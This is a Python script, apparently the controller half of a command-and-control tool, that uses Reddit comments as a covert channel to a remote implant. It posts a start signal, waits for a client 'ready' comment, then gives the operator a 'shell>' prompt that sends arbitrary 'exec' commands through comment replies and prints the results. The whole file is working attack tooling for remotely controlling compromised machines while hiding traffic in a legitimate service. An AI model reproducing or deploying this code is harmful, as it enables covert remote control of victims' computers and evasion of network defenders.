import praw
import sys
import time
import argparse 

# Function to log into the reddit account
def login(username, password, client_id, client_secret):
	reddit = praw.Reddit(username = username,
					password = password,
					client_id = client_id,
					client_secret = client_secret,
					user_agent = "Reddit CnC - CommandCenter")
	return reddit


# Function to post a start signal
def start_signal(reddit, subreddit, post_id):
        # Create a submission and post the start signal for the CnC
        submission = reddit.submission(url="https://www.reddit.com/r/{0}/comments/{1}".format(subreddit, post_id))
        print("[+] Creating CnC start signal")
        submission.reply('start')


# Function to check if the client is ready
def check_client(reddit, parsed_comments_list, subreddit):

    check = False 

    # Set the subreddit to use as CnC
    subreddit = reddit.subreddit(subreddit)

    print("[+] Checking for ready command")
    for comment in subreddit.stream.comments():
        if "ready" in comment.body and comment.id not in parsed_comments_list:
            print("[+] Client ready command observed")
            print("[+] Executing whoami command")
            comment.reply("exec whoami")
            check = True
            break
    return check


# Function to execute new commands and parse results
def command(reddit, parsed_comments_list, client_check, subreddit, post_id):

    # Set the subreddit to use as CnC
    subreddit = reddit.subreddit(subreddit)

    # Loop over the comments found in the subreddit
    for comment in subreddit.stream.comments():
        # If the "result" keyword is found, show the contents
        if "result" in comment.body and comment.id not in parsed_comments_list:
            print(str(comment.body).replace("result ", ""))
            command = raw_input("shell> ")
            # Reply with an exit command when executing "exit"
            if command == "exit":
                print("[+] Exiting...")
                comment.reply("exec " + command)
                sys.exit(0)
            # Comment the command and prepend "exec "
            else:
                comment.reply("exec " + command)
                parsed_comments_list.append(comment.id)
    #time.sleep(2)

# Keep track of the comment ID's that are already parsed
def parsed_comments():
	parsed_comments_list = []
	return parsed_comments_list


if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('--username', help='reddit account to use', dest='username', required=True)
    parser.add_argument('--password', help='password for the reddit account', dest='password', required=True)
    parser.add_argument('--client-id', help='reddit account client id', dest='client_id', required=True)
    parser.add_argument('--client-secret', help='reddit account secret', dest='client_secret', required=True)
    parser.add_argument('--subreddit', help='subreddit to use', dest='subreddit', required=True)
    parser.add_argument('--post-id', help='post id to use', dest='post_id', required=True)

    args = parser.parse_args()

    print("\n" + "#" * 8 + " Reddit CnC shell " + "#" * 8 + "\n")

    # Log into Reddit with the given parameters
    print("[+] Starting Reddit login procedure")
    reddit_login = login(args.username, args.password, args.client_id, args.client_secret)

    # Execute the following if the Reddit login was successful
    if bool(reddit_login) is True:
        print("[+] Reddit login successful")

        # Comment the start signal
        start_signal(reddit_login, args.subreddit, args.post_id)

         # Instantiate the list to track the comment ID's
        parsed_reddit_comments = parsed_comments()

        # Perform a check to see if the client is ready
        client_check = check_client(reddit_login, parsed_reddit_comments, args.subreddit)

        # Start the shell when the client has been observed
        if bool(client_check) is True:
            while True:
                command(reddit_login, parsed_reddit_comments, client_check, args.subreddit, args.post_id)
    else:
        print("[+] Failed to login")
        print("[+] Exiting...")
        sys.exit(0)